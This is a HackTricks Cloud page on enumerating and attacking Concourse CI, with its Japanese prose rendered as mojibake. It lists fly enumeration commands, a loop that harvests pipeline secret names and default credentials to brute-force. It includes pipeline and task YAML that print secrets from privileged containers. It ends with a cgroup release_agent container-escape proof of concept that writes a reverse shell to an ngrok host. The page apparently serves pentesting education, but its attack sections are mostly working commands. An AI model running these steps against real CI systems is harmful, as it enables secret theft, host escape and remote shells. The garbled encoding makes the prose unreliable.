# Concourse åˆ—æŒ™ & æ”»æ’ƒ

<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã™ã‚‹ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹**ã€ã¾ãŸã¯**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* **HackTricks**ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’å…±æœ‰ã™ã‚‹ã€‚

</details>

## ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ­ãƒ¼ãƒ« & æ¨©é™

Concourseã«ã¯5ã¤ã®ãƒ­ãƒ¼ãƒ«ãŒã‚ã‚Šã¾ã™:

* _Concourse_ **ç®¡ç†è€…**: ã“ã®ãƒ­ãƒ¼ãƒ«ã¯**ãƒ¡ã‚¤ãƒ³ãƒãƒ¼ãƒ **ï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®åˆæœŸConcourseãƒãƒ¼ãƒ ï¼‰ã®æ‰€æœ‰è€…ã«ã®ã¿ä¸ãˆã‚‰ã‚Œã¾ã™ã€‚ç®¡ç†è€…ã¯**ä»–ã®ãƒãƒ¼ãƒ ã‚’è¨­å®š**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆä¾‹: `fly set-team`, `fly destroy-team`...ï¼‰ã€‚ã“ã®ãƒ­ãƒ¼ãƒ«ã®æ¨©é™ã¯RBACã«ã‚ˆã£ã¦å½±éŸ¿ã‚’å—ã‘ã¾ã›ã‚“ã€‚
* **ã‚ªãƒ¼ãƒŠãƒ¼**: ãƒãƒ¼ãƒ ã®ã‚ªãƒ¼ãƒŠãƒ¼ã¯**ãƒãƒ¼ãƒ å†…ã®ã™ã¹ã¦ã‚’å¤‰æ›´**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* **ãƒ¡ãƒ³ãƒãƒ¼**: ãƒãƒ¼ãƒ ãƒ¡ãƒ³ãƒãƒ¼ã¯**ãƒãƒ¼ãƒ ã®è³‡ç”£å†…ã§èª­ã¿æ›¸ã**ãŒã§ãã¾ã™ãŒã€ãƒãƒ¼ãƒ è¨­å®šã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚
* **ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚ªãƒšãƒ¬ãƒ¼ã‚¿ãƒ¼**: ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚ªãƒšãƒ¬ãƒ¼ã‚¿ãƒ¼ã¯ãƒ“ãƒ«ãƒ‰ã®ãƒˆãƒªã‚¬ãƒ¼ã‚„ãƒªã‚½ãƒ¼ã‚¹ã®ãƒ”ãƒ³ç•™ã‚ãªã©ã®**ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³æ“ä½œ**ã‚’å®Ÿè¡Œã§ãã¾ã™ãŒã€ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³è¨­å®šã‚’æ›´æ–°ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚
* **ãƒ“ãƒ¥ãƒ¼ã‚¢ãƒ¼**: ãƒãƒ¼ãƒ ãƒ“ãƒ¥ãƒ¼ã‚¢ãƒ¼ã¯ãƒãƒ¼ãƒ ã¨ãã®ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã¸ã®**"èª­ã¿å–ã‚Šå°‚ç”¨"ã‚¢ã‚¯ã‚»ã‚¹**ã‚’æŒã£ã¦ã„ã¾ã™ã€‚

{% hint style="info" %}
ã•ã‚‰ã«ã€**ã‚ªãƒ¼ãƒŠãƒ¼ã€ãƒ¡ãƒ³ãƒãƒ¼ã€ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚ªãƒšãƒ¬ãƒ¼ã‚¿ãƒ¼ã€ãƒ“ãƒ¥ãƒ¼ã‚¢ãƒ¼ã®ãƒ­ãƒ¼ãƒ«ã®æ¨©é™ã¯ã€RBACã‚’è¨­å®šã™ã‚‹ã“ã¨ã§å¤‰æ›´ã§ãã¾ã™**ï¼ˆã‚ˆã‚Šå…·ä½“çš„ã«ã¯ãã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¨­å®šã—ã¾ã™ï¼‰ã€‚è©³ç´°ã«ã¤ã„ã¦ã¯ã“ã¡ã‚‰ã‚’èª­ã‚“ã§ãã ã•ã„: [https://concourse-ci.org/user-roles.html](https://concourse-ci.org/user-roles.html)
{% endhint %}

Concourseã¯**ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’ãƒãƒ¼ãƒ å†…ã«ã‚°ãƒ«ãƒ¼ãƒ—åŒ–**ã—ã¦ã„ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ã—ãŸãŒã£ã¦ã€ãƒãƒ¼ãƒ ã«å±ã™ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ãã‚Œã‚‰ã®ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’ç®¡ç†ã§ãã€**è¤‡æ•°ã®ãƒãƒ¼ãƒ **ãŒå­˜åœ¨ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯è¤‡æ•°ã®ãƒãƒ¼ãƒ ã«å±ã—ã€ãã‚Œãã‚Œã®ãƒãƒ¼ãƒ å†…ã§ç•°ãªã‚‹æ¨©é™ã‚’æŒã¤ã“ã¨ãŒã§ãã¾ã™ã€‚

## Vars & è³‡æ ¼æƒ…å ±ãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼

YAMLè¨­å®šã§ã¯ã€æ§‹æ–‡ `((_source-name_:_secret-path_._secret-field_))` ã‚’ä½¿ç”¨ã—ã¦å€¤ã‚’è¨­å®šã§ãã¾ã™ã€‚\
**source-nameã¯ã‚ªãƒ—ã‚·ãƒ§ãƒ³**ã§ã€çœç•¥ã•ã‚ŒãŸå ´åˆã¯ã€[ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å…¨ä½“ã®è³‡æ ¼æƒ…å ±ãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼](https://concourse-ci.org/vars.html#cluster-wide-credential-manager)ãŒä½¿ç”¨ã•ã‚Œã‚‹ã‹ã€ã¾ãŸã¯å€¤ãŒ[é™çš„ã«](https://concourse-ci.org/vars.html#static-vars)æä¾›ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚\
**ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã®**_**secret-field**_ã¯ã€å–å¾—ã—ãŸç§˜å¯†ã®èª­ã¿å–ã‚Šã«ä½¿ç”¨ã™ã‚‹ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã‚’æŒ‡å®šã—ã¾ã™ã€‚çœç•¥ã•ã‚ŒãŸå ´åˆã€è³‡æ ¼æƒ…å ±ãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼ã¯ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ãŒå­˜åœ¨ã™ã‚‹å ´åˆã«å–å¾—ã—ãŸè³‡æ ¼æƒ…å ±ã‹ã‚‰ã€Œãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã€ã‚’èª­ã¿å–ã‚‹ã“ã¨ã‚’é¸æŠã™ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚\
ã•ã‚‰ã«ã€_**secret-path**_ ã¨ _**secret-field**_ ã¯ã€`.` ã‚„ `:` ã®ã‚ˆã†ãª**ç‰¹æ®Šæ–‡å­—ã‚’å«ã‚€å ´åˆ**ã«ã¯ãƒ€ãƒ–ãƒ«ã‚¯ã‚©ãƒ¼ãƒˆ `"..."` ã§å›²ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚ä¾‹ãˆã°ã€`((source:"my.secret"."field:1"))` ã¯ _secret-path_ ã‚’ `my.secret` ã«ã€_secret-field_ ã‚’ `field:1` ã«è¨­å®šã—ã¾ã™ã€‚

### é™çš„Vars

é™çš„Varsã¯**ã‚¿ã‚¹ã‚¯ã‚¹ãƒ†ãƒƒãƒ—**ã§æŒ‡å®šã§ãã¾ã™ï¼š
```yaml
- task: unit-1.13
file: booklit/ci/unit.yml
vars: {tag: 1.13}
```
ä»¥ä¸‹ã® `fly` **å¼•æ•°**ã‚’ä½¿ç”¨ã™ã‚‹:

* `-v` ã¾ãŸã¯ `--var` `NAME=VALUE` ã¯æ–‡å­—åˆ— `VALUE` ã‚’å¤‰æ•° `NAME` ã®å€¤ã¨ã—ã¦è¨­å®šã—ã¾ã™ã€‚
* `-y` ã¾ãŸã¯ `--yaml-var` `NAME=VALUE` ã¯ `VALUE` ã‚’YAMLã¨ã—ã¦è§£æã—ã€ãã‚Œã‚’å¤‰æ•° `NAME` ã®å€¤ã¨ã—ã¦è¨­å®šã—ã¾ã™ã€‚
* `-i` ã¾ãŸã¯ `--instance-var` `NAME=VALUE` ã¯ `VALUE` ã‚’YAMLã¨ã—ã¦è§£æã—ã€ãã‚Œã‚’ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹å¤‰æ•° `NAME` ã®å€¤ã¨ã—ã¦è¨­å®šã—ã¾ã™ã€‚ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹å¤‰æ•°ã«ã¤ã„ã¦ã®è©³ç´°ã¯ [Grouping Pipelines](https://concourse-ci.org/instanced-pipelines.html) ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚
* `-l` ã¾ãŸã¯ `--load-vars-from` `FILE` ã¯ `FILE` (å¤‰æ•°åã¨å€¤ã®ãƒãƒƒãƒ”ãƒ³ã‚°ã‚’å«ã‚€YAMLãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ) ã‚’èª­ã¿è¾¼ã¿ã€ã™ã¹ã¦ã®å¤‰æ•°ã‚’è¨­å®šã—ã¾ã™ã€‚

### Credential Management

ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³å†…ã§ **Credential Managerã‚’æŒ‡å®šã™ã‚‹** æ–¹æ³•ã¯ã„ãã¤ã‹ã‚ã‚Šã¾ã™ã€‚è©³ç´°ã¯ [https://concourse-ci.org/creds.html](https://concourse-ci.org/creds.html) ã‚’èª­ã‚“ã§ãã ã•ã„ã€‚\
ã•ã‚‰ã«ã€Concourseã¯ç•°ãªã‚‹credential managersã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™:

* [The Vault credential manager](https://concourse-ci.org/vault-credential-manager.html)
* [The CredHub credential manager](https://concourse-ci.org/credhub-credential-manager.html)
* [The AWS SSM credential manager](https://concourse-ci.org/aws-ssm-credential-manager.html)
* [The AWS Secrets Manager credential manager](https://concourse-ci.org/aws-asm-credential-manager.html)
* [Kubernetes Credential Manager](https://concourse-ci.org/kubernetes-credential-manager.html)
* [The Conjur credential manager](https://concourse-ci.org/conjur-credential-manager.html)
* [Caching credentials](https://concourse-ci.org/creds-caching.html)
* [Redacting credentials](https://concourse-ci.org/creds-redacting.html)
* [Retrying failed fetches](https://concourse-ci.org/creds-retry-logic.html)

{% hint style="danger" %}
Concourseã«ä½•ã‚‰ã‹ã®**æ›¸ãè¾¼ã¿ã‚¢ã‚¯ã‚»ã‚¹æ¨©**ãŒã‚ã‚‹å ´åˆã€ConcourseãŒãã‚Œã‚‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å¿…è¦ãŒã‚ã‚‹ãŸã‚ã€ã‚¸ãƒ§ãƒ–ã‚’ä½œæˆã—ã¦**ãã‚Œã‚‰ã®ç§˜å¯†ã‚’æŠœãå–ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚
{% endhint %}

## Concourse Enumeration

Concourseç’°å¢ƒã‚’åˆ—æŒ™ã™ã‚‹ãŸã‚ã«ã¯ã€ã¾ãš**æœ‰åŠ¹ãªèªè¨¼æƒ…å ±**ã‚’é›†ã‚ã‚‹ã‹ã€`.flyrc` è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã§**èªè¨¼æ¸ˆã¿ã®ãƒˆãƒ¼ã‚¯ãƒ³**ã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

### Login and Current User enum

* ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹ã«ã¯ã€**ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆ**ã€**ãƒãƒ¼ãƒ å**ï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã¯ `main`ï¼‰ã€ãŠã‚ˆã³**ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒå±ã™ã‚‹ãƒãƒ¼ãƒ **ã‚’çŸ¥ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™:
* `fly --target example login --team-name my-team --concourse-url https://ci.example.com [--insecure] [--client-cert=./path --client-key=./path]`
* è¨­å®šã•ã‚ŒãŸ**ã‚¿ãƒ¼ã‚²ãƒƒãƒˆ**ã‚’å–å¾—ã—ã¾ã™:
* `fly targets`
* è¨­å®šã•ã‚ŒãŸ**ã‚¿ãƒ¼ã‚²ãƒƒãƒˆæ¥ç¶š**ãŒã¾ã **æœ‰åŠ¹**ã§ã‚ã‚‹ã‹ã‚’å–å¾—ã—ã¾ã™:
* `fly -t <target> status`
* æŒ‡å®šã•ã‚ŒãŸã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«å¯¾ã™ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®**å½¹å‰²**ã‚’å–å¾—ã—ã¾ã™:
* `fly -t <target> userinfo`

{% hint style="info" %}
**APIãƒˆãƒ¼ã‚¯ãƒ³**ã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ `$HOME/.flyrc` ã«**ä¿å­˜**ã•ã‚Œã¦ã„ã‚‹ãŸã‚ã€ãƒã‚·ãƒ³ã‚’æ¢ç´¢ã™ã‚‹éš›ã«ãã“ã§èªè¨¼æƒ…å ±ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
{% endhint %}

### Teams & Users

* ãƒãƒ¼ãƒ ã®ãƒªã‚¹ãƒˆã‚’å–å¾—ã—ã¾ã™
* `fly -t <target> teams`
* ãƒãƒ¼ãƒ å†…ã®å½¹å‰²ã‚’å–å¾—ã—ã¾ã™
* `fly -t <target> get-team -n <team-name>`
* ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒªã‚¹ãƒˆã‚’å–å¾—ã—ã¾ã™
* `fly -t <target> active-users`

### Pipelines

* ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’**ãƒªã‚¹ãƒˆ**ã—ã¾ã™:
* `fly -t <target> pipelines -a`
* ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³yamlã‚’**å–å¾—**ã—ã¾ã™ï¼ˆå®šç¾©å†…ã«**æ©Ÿå¯†æƒ…å ±**ãŒå«ã¾ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ï¼‰:
* `fly -t <target> get-pipeline -p <pipeline-name>`
* ã™ã¹ã¦ã®ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³**è¨­å®šå®£è¨€ã•ã‚ŒãŸå¤‰æ•°**ã‚’å–å¾—ã—ã¾ã™
* `for pipename in $(fly -t <target> pipelines | grep -Ev "^id" | awk '{print $2}'); do echo $pipename; fly -t <target> get-pipeline -p $pipename -j | grep -Eo '"vars":[^}]+'; done`
* ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹**ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®ç§˜å¯†å**ã‚’ã™ã¹ã¦å–å¾—ã—ã¾ã™ï¼ˆã‚¸ãƒ§ãƒ–ã‚’ä½œæˆ/å¤‰æ›´ã—ãŸã‚Šã€ã‚³ãƒ³ãƒ†ãƒŠã‚’ãƒã‚¤ã‚¸ãƒ£ãƒƒã‚¯ã§ãã‚‹å ´åˆã€ãã‚Œã‚‰ã‚’æŠœãå–ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼‰:
```bash
rm /tmp/secrets.txt;
for pipename in $(fly -t onelogin pipelines | grep -Ev "^id" | awk '{print $2}'); do
echo $pipename;
fly -t onelogin get-pipeline -p $pipename | grep -Eo '\(\(.*\)\)' | sort | uniq | tee -a /tmp/secrets.txt;
echo "";
done
echo ""
echo "ALL SECRETS"
cat /tmp/secrets.txt | sort | uniq
rm /tmp/secrets.txt
```
### ã‚³ãƒ³ãƒ†ãƒŠ & ãƒ¯ãƒ¼ã‚«ãƒ¼

* **ãƒ¯ãƒ¼ã‚«ãƒ¼**ã®ãƒªã‚¹ãƒˆ:
* `fly -t <target> workers`
* **ã‚³ãƒ³ãƒ†ãƒŠ**ã®ãƒªã‚¹ãƒˆ:
* `fly -t <target> containers`
* **ãƒ“ãƒ«ãƒ‰**ã®ãƒªã‚¹ãƒˆï¼ˆå®Ÿè¡Œä¸­ã®ã‚‚ã®ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ï¼‰:
* `fly -t <target> builds`

## Concourse æ”»æ’ƒ

### è³‡æ ¼æƒ…å ±ã®ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹

* admin:admin
* test:test

### ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã¨ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®åˆ—æŒ™

å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã§ä½¿ç”¨ã•ã‚Œã‚‹**ã™ã¹ã¦ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆåã¨å¤‰æ•°ã‚’å–å¾—ã™ã‚‹æ–¹æ³•**ã‚’è¦‹ã¾ã—ãŸã€‚**å¤‰æ•°ã«ã¯æ©Ÿå¯†æƒ…å ±ãŒå«ã¾ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Š**ã€**ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®åå‰ã¯å¾Œã§ãã‚Œã‚‰ã‚’ç›—ã‚€ãŸã‚ã«å½¹ç«‹ã¡ã¾ã™**ã€‚

### å®Ÿè¡Œä¸­ã¾ãŸã¯æœ€è¿‘å®Ÿè¡Œã•ã‚ŒãŸã‚³ãƒ³ãƒ†ãƒŠå†…ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³

ååˆ†ãªæ¨©é™ï¼ˆ**ãƒ¡ãƒ³ãƒãƒ¼ãƒ­ãƒ¼ãƒ«ä»¥ä¸Š**ï¼‰ãŒã‚ã‚Œã°ã€**ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã¨ãƒ­ãƒ¼ãƒ«ã‚’ãƒªã‚¹ãƒˆ**ã—ã¦ã€`<pipeline>/<job>` **ã‚³ãƒ³ãƒ†ãƒŠ**å†…ã§**ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’é–‹å§‹**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä½¿ç”¨æ–¹æ³•:
```bash
fly -t tutorial intercept --job pipeline-name/job-name
fly -t tutorial intercept # To be presented a prompt with all the options
```
ä»¥ä¸‹ã®æ¨©é™ãŒã‚ã‚Œã°ã€æ¬¡ã®ã“ã¨ãŒå¯èƒ½ã§ã™ï¼š

* **ã‚³ãƒ³ãƒ†ãƒŠ**å†…ã®**ç§˜å¯†æƒ…å ±ã‚’ç›—ã‚€**
* ãƒãƒ¼ãƒ‰ã¸ã®**è„±å‡º**ã‚’è©¦ã¿ã‚‹
* **ã‚¯ãƒ©ã‚¦ãƒ‰ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿**ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã®åˆ—æŒ™/æ‚ªç”¨ï¼ˆå¯èƒ½ã§ã‚ã‚Œã°ã€ãƒãƒƒãƒ‰ã¨ãƒãƒ¼ãƒ‰ã®ä¸¡æ–¹ã‹ã‚‰ï¼‰

### ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®ä½œæˆ/å¤‰æ›´

ååˆ†ãªæ¨©é™ï¼ˆ**ãƒ¡ãƒ³ãƒãƒ¼ãƒ­ãƒ¼ãƒ«ä»¥ä¸Š**ï¼‰ãŒã‚ã‚Œã°ã€**æ–°ã—ã„ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®ä½œæˆ/å¤‰æ›´**ãŒã§ãã¾ã™ã€‚ã“ã®ä¾‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š
```yaml
jobs:
- name: simple
plan:
- task: simple-task
privileged: true
config:
# Tells Concourse which type of worker this task should run on
platform: linux
image_resource:
type: registry-image
source:
repository: busybox # images are pulled from docker hub by default
run:
path: sh
args:
- -cx
- |
echo "$SUPER_SECRET"
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```
æ–°ã—ã„ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®**å¤‰æ›´/ä½œæˆ**ã«ã‚ˆã‚Šã€ä»¥ä¸‹ã®ã“ã¨ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ï¼š

* **ç§˜å¯†**ã‚’**ç›—ã‚€**ï¼ˆãã‚Œã‚‰ã‚’ã‚¨ã‚³ãƒ¼ã™ã‚‹ã‹ã€ã‚³ãƒ³ãƒ†ãƒŠå†…ã«å…¥ã£ã¦`env`ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦ï¼‰
* **ãƒãƒ¼ãƒ‰**ã¸ã®**è„±å‡º**ï¼ˆååˆ†ãªæ¨©é™ã‚’ä¸ãˆã‚‹ã“ã¨ã«ã‚ˆã£ã¦ - `privileged: true`ï¼‰
* **ã‚¯ãƒ©ã‚¦ãƒ‰ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿**ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã®åˆ—æŒ™/æ‚ªç”¨ï¼ˆãƒãƒƒãƒ‰ã¨ãƒãƒ¼ãƒ‰ã‹ã‚‰ï¼‰
* ä½œæˆã•ã‚ŒãŸãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®**å‰Šé™¤**

### ã‚«ã‚¹ã‚¿ãƒ ã‚¿ã‚¹ã‚¯ã®å®Ÿè¡Œ

ã“ã‚Œã¯å‰ã®æ–¹æ³•ã¨ä¼¼ã¦ã„ã¾ã™ãŒã€æ–°ã—ã„ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³å…¨ä½“ã‚’å¤‰æ›´/ä½œæˆã™ã‚‹ä»£ã‚ã‚Šã«ã€**ã‚«ã‚¹ã‚¿ãƒ ã‚¿ã‚¹ã‚¯ã‚’ãŸã å®Ÿè¡Œã™ã‚‹**ã“ã¨ãŒã§ãã¾ã™ï¼ˆã“ã‚Œã¯ãŠãã‚‰ããšã£ã¨**ç›®ç«‹ãŸãªã„**ã§ã—ã‚‡ã†ï¼‰ï¼š
```yaml
# For more task_config options check https://concourse-ci.org/tasks.html
platform: linux
image_resource:
type: registry-image
source:
repository: ubuntu
run:
path: sh
args:
- -cx
- |
env
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```

```bash
fly -t tutorial execute --privileged --config task_config.yml
```
### ç‰¹æ¨©ã‚¿ã‚¹ã‚¯ã‹ã‚‰ãƒãƒ¼ãƒ‰ã¸ã®è„±å‡º

å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€**Concourseã§ç‰¹æ¨©ã‚¿ã‚¹ã‚¯ã‚’å®Ÿè¡Œã™ã‚‹æ–¹æ³•**ã‚’è¦‹ã¾ã—ãŸã€‚ã“ã‚Œã¯ã€Dockerã‚³ãƒ³ãƒ†ãƒŠã®privilegedãƒ•ãƒ©ã‚°ã¨å…¨ãåŒã˜ã‚¢ã‚¯ã‚»ã‚¹ã‚’ã‚³ãƒ³ãƒ†ãƒŠã«ä¸ãˆã‚‹ã‚ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ä¾‹ãˆã°ã€/devã«ãƒãƒ¼ãƒ‰ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ãƒ‡ãƒã‚¤ã‚¹ãŒè¦‹ãˆãªã„ãŸã‚ã€è„±å‡ºã¯ã‚‚ã£ã¨ã€Œè¤‡é›‘ã€ã«ãªã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

ä»¥ä¸‹ã®PoCã§ã¯ã€release\_agentã‚’ä½¿ç”¨ã—ã¦ã€ã„ãã¤ã‹ã®å°ã•ãªå¤‰æ›´ã‚’åŠ ãˆã¦è„±å‡ºã—ã¾ã™ï¼š
```bash
# Mounts the RDMA cgroup controller and create a child cgroup
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the memory cgroup controller, try change memory to rdma to fix it
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release


# CHANGE ME
# The host path will look like the following, but you need to change it:
host_path="/mnt/vda1/hostpath-provisioner/default/concourse-work-dir-concourse-release-worker-0/overlays/ae7df0ca-0b38-4c45-73e2-a9388dcb2028/rootfs"

## The initial path "/mnt/vda1" is probably the same, but you can check it using the mount command:
#/dev/vda1 on /scratch type ext4 (rw,relatime)
#/dev/vda1 on /tmp/build/e55deab7 type ext4 (rw,relatime)
#/dev/vda1 on /etc/hosts type ext4 (rw,relatime)
#/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)

## Then next part I think is constant "hostpath-provisioner/default/"

## For the next part "concourse-work-dir-concourse-release-worker-0" you need to know how it's constructed
# "concourse-work-dir" is constant
# "concourse-release" is the consourse prefix of the current concourse env (you need to find it from the API)
# "worker-0" is the name of the worker the container is running in (will be usually that one or incrementing the number)

## The final part "overlays/bbedb419-c4b2-40c9-67db-41977298d4b3/rootfs" is kind of constant
# running `mount | grep "on / " | grep -Eo "workdir=([^,]+)"` you will see something like:
# workdir=/concourse-work-dir/overlays/work/ae7df0ca-0b38-4c45-73e2-a9388dcb2028
# the UID is the part we are looking for

# Then the host_path is:
#host_path="/mnt/<device>/hostpath-provisioner/default/concourse-work-dir-<concourse_prefix>-worker-<num>/overlays/<UID>/rootfs"

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent


#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% hint style="warning" %}
